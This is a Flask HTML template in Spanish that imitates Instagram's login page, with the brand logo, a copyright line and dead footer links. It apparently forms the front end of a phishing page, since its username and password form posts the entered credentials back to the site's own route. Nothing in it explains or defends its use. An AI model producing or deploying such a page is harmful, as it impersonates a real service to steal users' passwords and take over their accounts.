<!DOCTYPE html>
<html lang="es">
<head>
	<meta charset="UTF-8">
	<title>Instagram</title>
	<link rel="stylesheet" href="{{ url_for('static', filename='css/styles.css') }}"></head>
<body>

<div class="wrapper">
	<div class="header">
		<div class="top">
			<div class="logo">
				<img src="{{ url_for('static', filename='images/instagram.png') }}" alt="instagram" style="width: 175px;">
			</div>
			<div class="form">
				<form action="" method="post">
					<div class="input_field">
						<input type="text" placeholder="Número de teléfono, nombre de usuario o correo electrónico" class="input" name="username">
					</div>
					<div class="input_field">
						<input type="password" placeholder="Contraseña" class="input" name="password">
					</div>
					<div class="btn">
						<button class="login-btn" type="submit">Iniciar sesión</button>
					</div>
				</form>
			</div>
			<div class="or">
				<div class="line"></div>
				<p>O</p>
				<div class="line"></div>
			</div>
			<div class="dif">
				<div class="fb">
					<img src="{{ url_for('static', filename='images/facebook.png') }}" alt="facebook">
					<p>Iniciar sesión con Facebook</p>
				</div>
				<div class="forgot">
					<a href="#">¿Olvidó su contraseña?</a>
				</div>
			</div>
		</div>
		<div class="signup">
			<p>¿No tiene una cuenta? <a href="#">Registrarse</a></p>
		</div>
		<div class="apps">
			<p>Obtenga la aplicación.</p>
			<div class="icons">
				<a href="#"><img src="{{ url_for('static', filename='images/appstore.png') }}" alt="appstore"></a>
				<a href="#"><img src="{{ url_for('static', filename='images/googleplay.png') }}" alt="googleplay"></a>
			</div>
		</div>
	</div>
	<div class="footer">
		<div class="links">
			<ul>
				<li><a href="#">ACERCA DE NOSOTROS</a></li>
				<li><a href="#">SOPORTE</a></li>
				<li><a href="#">PRENSA</a></li>
				<li><a href="#">API</a></li>
				<li><a href="#">TRABAJOS</a></li>
				<li><a href="#">PRIVACIDAD</a></li>
				<li><a href="#">TÉRMINOS</a></li>
				<li><a href="#">DIRECTORIO</a></li>
				<li><a href="#">PERFILES</a></li>
				<li><a href="#">HASHTAGS</a></li>
				<li><a href="#">IDIOMA</a></li>
			</ul>
		</div>
		<div class="copyright">
			© 2024 Instagram from Meta
		</div>
	</div>
</div>

</body>
</html>
